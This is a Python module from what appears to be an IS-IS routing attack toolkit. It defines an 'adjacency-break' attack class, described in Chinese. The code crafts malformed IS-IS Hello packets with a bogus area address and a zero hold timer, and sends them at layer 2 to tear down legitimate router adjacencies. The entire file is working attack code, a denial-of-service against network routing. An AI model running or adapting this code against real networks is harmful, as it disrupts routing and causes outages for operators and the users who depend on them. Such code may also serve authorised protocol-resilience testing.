from isis_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from isis_attack.config.types import IIHConfig
from isis_attack.core.packet import build_iih_packet
from isis_attack.network.sender import PacketSender


class AdjacencyBreakAttack(BaseAttack):
    name = "adjacency-break"
    description = "注入畸形 IIH (错误 Area/Hold=0) 破坏合法邻接"
    category = AttackCategory.ADJACENCY
    config: IIHConfig

    def setup(self) -> None:
        from isis_attack.network.adapter import get_local_mac
        self._src_mac = get_local_mac(self.config.iface)
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        pkt = build_iih_packet(
            sys_id=self.config.sys_id,
            area_addr="49.9999",
            src_mac=self._src_mac,
            level=self.config.level,
            priority=0,
            hold_timer=0,
        )
        ok = self._sender.send_l2(pkt)
        return AttackResult(
            success=ok, packets_sent=self._sender.sent_count,
            target_affected=False,
            details="邻接破坏: 注入错误 Area 地址 + Hold=0 的 IIH",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
